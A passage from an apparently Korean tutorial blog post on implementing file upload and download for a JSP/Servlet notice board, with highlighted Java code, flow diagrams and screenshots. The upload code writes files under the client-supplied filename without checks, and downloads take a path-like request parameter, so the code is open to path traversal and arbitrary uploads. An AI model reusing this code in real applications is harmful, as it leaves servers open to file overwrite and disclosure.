<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">beforeUploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">beforeFolderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 글 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">noticeDAO</span><span class="o">.</span><span class="na">deleteNotice</span><span class="o">(</span><span class="n">sid</span><span class="o">)){</span> <span class="c1">// 삭제 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 새로운 글 저장</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">genTime</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newSid</span> <span class="o">=</span> <span class="n">noticeDAO</span><span class="o">.</span><span class="na">saveNotice</span><span class="o">(</span><span class="n">user</span><span class="o">,</span> <span class="n">title</span><span class="o">,</span> <span class="n">mainText</span><span class="o">,</span> <span class="n">genTime</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">newSid</span><span class="o">==</span><span class="mi">0</span><span class="o">){</span> <span class="c1">// 실패</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('fail');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span>   
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"no new file"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">try</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">folder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">beforeUploadPath</span><span class="o">);</span> <span class="c1">// 폴더</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newFolderName</span> <span class="o">=</span> <span class="n">genTime</span><span class="o">+</span><span class="s">"_"</span><span class="o">+</span><span class="n">newSid</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">afterUploadPath</span> <span class="o">=</span> <span class="n">getFilePath</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">newFolderName</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">newFolder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">afterUploadPath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">folder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 이름만 변경.</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">folder</span><span class="o">.</span><span class="na">renameTo</span><span class="o">(</span><span class="n">newFolder</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> 
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">parts</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParts</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="nl">part:</span><span class="n">parts</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">).</span><span class="na">contains</span><span class="o">(</span><span class="s">"filename="</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">)){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">continue</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">newFolder</span><span class="o">.</span><span class="na">exists</span><span class="o">()){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 폴더 생성</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">newFolder</span><span class="o">.</span><span class="na">mkdir</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">newSid</span><span class="o">+</span><span class="s">"게시글 폴더 생성 함"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">count</span> <span class="o">=</span> <span class="n">newFolder</span><span class="o">.</span><span class="na">listFiles</span><span class="o">().</span><span class="na">length</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 갯수 : "</span><span class="o">+</span><span class="n">count</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="no">MAX_FILE_NUM</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"최대 파일 갯수 초과"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"out of file number ( maxcount 3 )"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>

<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"퐅더 존재? =&gt; "</span><span class="o">+</span><span class="n">newFolder</span><span class="o">.</span><span class="na">isDirectory</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"타입 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getHeader</span><span class="o">(</span><span class="s">"Content-Disposition"</span><span class="o">));</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"크기 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSize</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"이름 : "</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">afterUploadPath</span><span class="o">+</span><span class="nc">File</span><span class="o">.</span><span class="na">separator</span><span class="o">+</span><span class="n">part</span><span class="o">.</span><span class="na">getSubmittedFileName</span><span class="o">());</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">part</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span> <span class="c1">// 임시 파일 삭제</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"파일 저장 성공"</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload success"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"경로 : "</span><span class="o">+</span><span class="n">afterUploadPath</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">noticeRe</span> <span class="o">=</span> <span class="s">"file upload fail"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 성공</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">result</span> <span class="o">=</span> <span class="s">"&lt;script&gt;alert('success : "</span><span class="o">+</span><span class="n">noticeRe</span><span class="o">+</span><span class="s">"');location.href='"</span><span class="o">+</span><span class="n">noticeBoard</span><span class="o">+</span><span class="s">"'&lt;/script&gt;"</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">simplePage</span><span class="o">(</span><span class="n">response</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
</code></pre></div></div>

<h2 id="파일-다운로드">파일 다운로드</h2>
<ul>
  <li>MIME를 이용하여 대용량 파일을 텍스트 문자 인코딩하여 전송한다.</li>
</ul>

<h3 id="게시판-첨부파일-다운로드">게시판 첨부파일 다운로드</h3>

<h4 id="jsp-2">JSP</h4>
<h5 id="설명-4">설명</h5>
<ul>
  <li>게시글 페이지 요청이 들어오면 첨부파일 링크도 추가한 게시글 페이지를 보여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/53a6493d-3a0f-4824-9620-60ade8b0e641" alt="Pasted image 20230525030427" /></li>
  <li>게시글에 업로드 된 파일의 다운로드 링크를 만들어준다.</li>
  <li>다운로드 링크를 누르면 서버에 저장된 파일을 다운받을 수 있다.</li>
  <li>첨부파일이 없을 경우 링크는 나타나지 않는다.</li>
</ul>

<h5 id="과정-4">과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsnpDshLjtnogg67O06riwIOyalOyyrVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg7Y6Y7J207KeAIOydkeuLtVxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDssqjrtoDtjIzsnbwg7YG066atXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyyqOu2gO2MjOydvCDri6TsmrTroZzrk5wg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IO2XpOuNlCDsnpHshLFcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog67KE7Y2866GcIOuCmOuIhOyWtCDsgqzsmqnsnpDsl5Dqsowg7J2R64u1IiwibWVybWFpZCI6bnVsbH0" /></p>

<ol>
  <li>사용자가 첨부파일 다운로드 링크를 클릭한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/3315f5f4-0f61-4b81-a2de-736ea46e035c" alt="Pasted image 20230525025925" /></li>
  <li>사용자는 서버로 파일 다운로드 get 요청을 보낸다.</li>
  <li>서버는 사용자에게 파일을 버퍼로 쪼개어 응답을 보내준다.</li>
  <li>다운로드 완료<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2e201d54-8fab-4691-9d9a-b6b47e3c6914" alt="Pasted image 20230525025952" /></li>
</ol>

<h5 id="코드--noticejsp-">코드 ( notice.jsp )</h5>

<ul>
  <li>파일 이름과 파일 위치 배열</li>
  <li>servlet으로 부터 배열을 받아온다.</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span>
<span class="kt">var</span> <span class="n">fileNameList</span> <span class="o">=</span> <span class="o">(</span><span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">Pair</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="err">&gt;&gt;</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"fileNameList"</span><span class="o">);</span>
<span class="nt">%&gt;</span>
</code></pre></div></div>

<ul>
  <li>게시글 파일 다운로드 링크</li>
</ul>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%</span> <span class="k">if</span><span class="o">(</span><span class="n">fileNameList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;tr&gt;</span>
    <span class="nt">&lt;td</span> <span class="na">style=</span><span class="s">"text-align: center;"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;span&gt;</span>첨부파일<span class="nt">&lt;/span&gt;</span>
    <span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;td&gt;</span>
        <span class="nt">&lt;%</span> <span class="k">for</span><span class="o">(</span><span class="kt">var</span> <span class="n">file</span> <span class="o">:</span> <span class="n">fileNameList</span> <span class="o">)</span> <span class="o">{</span> <span class="nt">%&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"${noticeBoardFileDownload}?downlink=</span><span class="nt">&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD2</span><span class="o">()</span> <span class="nt">%&gt;</span><span class="s">"</span><span class="nt">&gt;&lt;%=</span><span class="n">file</span><span class="o">.</span><span class="na">getD1</span><span class="o">()</span> <span class="nt">%&gt;&lt;/a&gt;&lt;br&gt;</span>
        <span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
    <span class="nt">&lt;/td&gt;</span>
<span class="nt">&lt;/tr&gt;</span>
<span class="nt">&lt;%</span> <span class="o">}</span> <span class="nt">%&gt;</span>
</code></pre></div></div>

<h4 id="servlet-2">Servlet</h4>
<h5 id="설명-5">설명</h5>
<ul>
  <li>게시글 페이지 요청이 들어오면 첨부파일 링크도 추가한 게시글 페이지를 보여준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f227ba6a-b0f9-4bc7-926b-49281fb03ca2" alt="Pasted image 20230525030435" /></li>
  <li>다운로드 요청이 들어오면 서버에서 파일을 버퍼 단위로 쪼개어 사용자에게 전송한다.</li>
  <li>다운로드 파일이 없으면 404 페이지를 보여준다.</li>
</ul>

<h5 id="과정-5">과정</h5>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IO2MjOydvCDri6TsmrTroZzrk5wg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyhtOyerO2VmOuKlCDtjIzsnbzsnbjsp4Ag7ZmV7J24XG7shJzrsoQgLT4-IOyEnOuyhCA6IOyWtOuKkCDruIzrnbzsmrDsoIDsl5DshJwg7JioIOyalOyyreyduOyngCDtmZXsnbhcbuyEnOuyhCAtPj4g7ISc67KEIDog7Zek642UIOyekeyEsVxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDrsoTtjbzroZwg64KY64iE7Ja0IOyCrOyaqeyekOyXkOqyjCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
<ol>
  <li>사용자가 다운로드 링크를 눌러 서버에 파일 다운로드 요청을 보낸다.</li>
  <li>서버는 가장먼저 서버에 파일이 존재하는지 확인한다.</li>
  <li>서버는 어느 브라우저에서 온 요청인지 확인한다.</li>
  <li>위에서 알아본 정보를 가지고 응답 헤더를 작성한다.</li>
  <li>서버는 파일을 버퍼 단위로 나누어 사용자에게 전달한다.</li>
</ol>

<h5 id="코드-mainpagejava-1">코드 (MainPage.java)</h5>

<ul>
  <li>게시글 파일 다운로드</li>
  <li>사용자 브라우저가 모질라일 때만 다운로드가 가능하다.</li>
  <li>헤더에 파일 사이즈를 입력하면 브라우저가 다운완료 시간을 예측한다.</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainPage</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
	<span class="o">...</span> <span class="n">생략</span> <span class="o">...</span>
